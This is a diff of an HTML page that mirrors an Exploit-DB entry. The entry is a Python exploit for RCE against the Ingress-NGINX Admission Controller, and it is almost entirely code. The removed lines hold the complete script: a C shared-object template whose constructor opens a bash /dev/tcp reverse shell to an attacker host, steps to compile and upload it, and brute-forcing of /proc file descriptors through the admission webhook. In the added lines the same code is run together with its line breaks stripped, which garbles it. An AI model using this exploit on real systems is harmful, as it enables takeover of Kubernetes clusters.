@@ -4,194 +4,68 @@
 <meta charset="UTF-8">
 <title>OffSec’s Exploit Database Archive</title>
 <style>
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
-  h1 { color: #00d9ff; margin-bottom: 0.5em; }
-  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
-  img { max-width: 100%; height: auto; border-radius: 8px; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
   a { color: #00d9ff; }
-  p { margin-bottom: 1em; }
-  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
   code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
-  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
-
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
   .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
   .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
   .article-elevator-btn:hover { background: rgba(10,14,39,1); }
-
 </style>
 </head>
 <body>
   <h1>OffSec’s Exploit Database Archive</h1>
   <div class="metadata">
-    Source: Exploit-DB | Date: 2/4/2026 | Lang: EN |
-    <a href="https://www.exploit-db.com/exploits/52475" target="_blank">Original Article</a>
+    Source: Exploit-DB | Date: 2/4/2026 1:00:00 AM | <a href="https://www.exploit-db.com/exploits/52475" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: EN
   </div>
   <div class="content">
-    <div><div>
-
-                        
-                        <pre><code># Exploit Title:  Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE 
-# Date: 2025-10-07
+    <div><div> <pre><code># Exploit Title: Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE # Date: 2025-10-07
 # Exploit Author: Beatriz Fresno Naumova
 # Vendor Homepage: https://kubernetes.io
 # Software Link: https://github.com/kubernetes/ingress-nginx
 # Version: Affects v1.10.0 to v1.11.1 (potentially others)
 # Tested on: Ubuntu 22.04, RKE2 Kubernetes Cluster
-# CVE: CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-1974
-
-import os
+# CVE: CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-1974 import os
 import sys
 import socket
 import requests
 import threading
 from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor
-import urllib3
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# --- Embedded malicious shared object template ---
+import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # --- Embedded malicious shared object template ---
 MALICIOUS_C_TEMPLATE = """
-#include &lt;stdlib.h&gt;
-
-__attribute__((constructor))
-void run_on_load() {
-    system("bash -c 'bash -i &gt;&amp; /dev/tcp/HOST/PORT 0&gt;&amp;1'");
+#include &lt;stdlib.h&gt; __attribute__((constructor))
+void run_on_load() { system("bash -c 'bash -i &gt;&amp; /dev/tcp/HOST/PORT 0&gt;&amp;1'");
+} int bind(void *e, const char *id) { return 1;
+} void ENGINE_load_evil() {} int bind_engine() { return 1;
 }
-
-int bind(void *e, const char *id) {
-    return 1;
-}
-
-void ENGINE_load_evil() {}
-
-int bind_engine() {
-    return 1;
-}
-"""
-
-def compile_shared_library(host, port, output_file="evil_engine.so"):
-    c_code = MALICIOUS_C_TEMPLATE.replace("HOST", host).replace("PORT", str(port))
-
-    with open("evil_engine.c", "w") as f:
-        f.write(c_code)
-
-    print("[*] Compiling malicious shared object...")
-    result = os.system("gcc -fPIC -Wall -shared -o evil_engine.so evil_engine.c -lcrypto")
-
-    if result == 0:
-        print("[+] Shared object compiled successfully.")
-        return True
-    else:
-        print("[!] Compilation failed. Is gcc installed?")
-        return False
-
-
-def send_brute_request(admission_url, json_template, proc, fd):
-    print(f"[*] Trying /proc/{proc}/fd/{fd}")
-    path = f"proc/{proc}/fd/{fd}"
-    payload = json_template.replace("REPLACE", path)
-
-    headers = {"Content-Type": "application/json"}
-    url = admission_url.rstrip("/") + "/admission"
-
-    try:
-        response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5)
-        print(f"[+] Response for /proc/{proc}/fd/{fd}: {response.status_code}")
-    except Exception as e:
-        print(f"[!] Error on /proc/{proc}/fd/{fd}: {e}")
-
-
-def brute_force_admission(admission_url, json_file="review.json", max_proc=50, max_fd=30, max_workers=5):
-    try:
-        with open(json_file, "r") as f:
-            json_data = f.read()
-    except FileNotFoundError:
-        print(f"[!] Error: {json_file} not found.")
-        return
-
-    print("[*] Starting brute-force against the admission webhook...")
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        for proc in range(1, max_proc):
-            for fd in range(3, max_fd):
-                executor.submit(send_brute_request, admission_url, json_data, proc, fd)
-
-
-def upload_shared_library(ingress_url, shared_object="evil_engine.so"):
-    try:
-        with open(shared_object, "rb") as f:
-            evil_payload = f.read()
-    except FileNotFoundError:
-        print(f"[!] Error: {shared_object} not found.")
-        return
-
-    parsed = urlparse(ingress_url)
-    host = parsed.hostname
-    port = parsed.port or 80
-    path = parsed.path or "/"
-
-    try:
-        sock = socket.create_connection((host, port))
-    except Exception as e:
-        print(f"[!] Failed to connect to {host}:{port}: {e}")
-        return
-
-    fake_length = len(evil_payload) + 10
-    headers = (
-        f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"User-Agent: qmx-ingress-exploiter\r\n"
-        f"Content-Type: application/octet-stream\r\n"
-        f"Content-Length: {fake_length}\r\n"
-        f"Connection: keep-alive\r\n\r\n"
-    ).encode("iso-8859-1")
-
-    print("[*] Uploading malicious shared object to ingress...")
-    sock.sendall(headers + evil_payload)
-
-    response = b""
-    while True:
-        chunk = sock.recv(4096)
-        if not chunk:
-            break
-        response += chunk
-
-    print("[*] Server response:\n")
-    print(response.decode(errors="ignore"))
-    sock.close()
-
-
-def main():
-    if len(sys.argv) != 4:
-        print("Usage: python3 exploit.py &lt;ingress_url&gt; &lt;admission_webhook_url&gt; &lt;rev_host:port&gt;")
-        sys.exit(1)
-
-    ingress_url = sys.argv[1]
-    admission_url = sys.argv[2]
-    rev_host_port = sys.argv[3]
-
-    if ':' not in rev_host_port:
-        print("[!] Invalid format for rev_host:port.")
-        sys.exit(1)
-
-    host, port = rev_host_port.split(":")
-
-    if not compile_shared_library(host, port):
-        sys.exit(1)
-
-    # Send the malicious shared object and keep the connection open
-    upload_thread = threading.Thread(target=upload_shared_library, args=(ingress_url,))
-    upload_thread.start()
-
-    # Simultaneously brute-force the admission webhook for valid file descriptors
-    brute_force_admission(admission_url)
-
-
-if __name__ == "__main__":
-    main()
-            </code></pre>
-
-                    </div></div>
+""" def compile_shared_library(host, port, output_file="evil_engine.so"): c_code = MALICIOUS_C_TEMPLATE.replace("HOST", host).replace("PORT", str(port)) with open("evil_engine.c", "w") as f: f.write(c_code) print("[*] Compiling malicious shared object...") result = os.system("gcc -fPIC -Wall -shared -o evil_engine.so evil_engine.c -lcrypto") if result == 0: print("[+] Shared object compiled successfully.") return True else: print("[!] Compilation failed. Is gcc installed?") return False def send_brute_request(admission_url, json_template, proc, fd): print(f"[*] Trying /proc/{proc}/fd/{fd}") path = f"proc/{proc}/fd/{fd}" payload = json_template.replace("REPLACE", path) headers = {"Content-Type": "application/json"} url = admission_url.rstrip("/") + "/admission" try: response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5) print(f"[+] Response for /proc/{proc}/fd/{fd}: {response.status_code}") except Exception as e: print(f"[!] Error on /proc/{proc}/fd/{fd}: {e}") def brute_force_admission(admission_url, json_file="review.json", max_proc=50, max_fd=30, max_workers=5): try: with open(json_file, "r") as f: json_data = f.read() except FileNotFoundError: print(f"[!] Error: {json_file} not found.") return print("[*] Starting brute-force against the admission webhook...") with ThreadPoolExecutor(max_workers=max_workers) as executor: for proc in range(1, max_proc): for fd in range(3, max_fd): executor.submit(send_brute_request, admission_url, json_data, proc, fd) def upload_shared_library(ingress_url, shared_object="evil_engine.so"): try: with open(shared_object, "rb") as f: evil_payload = f.read() except FileNotFoundError: print(f"[!] Error: {shared_object} not found.") return parsed = urlparse(ingress_url) host = parsed.hostname port = parsed.port or 80 path = parsed.path or "/" try: sock = socket.create_connection((host, port)) except Exception as e: print(f"[!] Failed to connect to {host}:{port}: {e}") return fake_length = len(evil_payload) + 10 headers = ( f"POST {path} HTTP/1.1\r\n" f"Host: {host}\r\n" f"User-Agent: qmx-ingress-exploiter\r\n" f"Content-Type: application/octet-stream\r\n" f"Content-Length: {fake_length}\r\n" f"Connection: keep-alive\r\n\r\n" ).encode("iso-8859-1") print("[*] Uploading malicious shared object to ingress...") sock.sendall(headers + evil_payload) response = b"" while True: chunk = sock.recv(4096) if not chunk: break response += chunk print("[*] Server response:\n") print(response.decode(errors="ignore")) sock.close() def main(): if len(sys.argv) != 4: print("Usage: python3 exploit.py &lt;ingress_url&gt; &lt;admission_webhook_url&gt; &lt;rev_host:port&gt;") sys.exit(1) ingress_url = sys.argv[1] admission_url = sys.argv[2] rev_host_port = sys.argv[3] if ':' not in rev_host_port: print("[!] Invalid format for rev_host:port.") sys.exit(1) host, port = rev_host_port.split(":") if not compile_shared_library(host, port): sys.exit(1) # Send the malicious shared object and keep the connection open upload_thread = threading.Thread(target=upload_shared_library, args=(ingress_url,)) upload_thread.start() # Simultaneously brute-force the admission webhook for valid file descriptors brute_force_admission(admission_url) if __name__ == "__main__": main() </code></pre> </div></div>
   </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'auto' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'auto' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
+      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
 </body>
 </html>
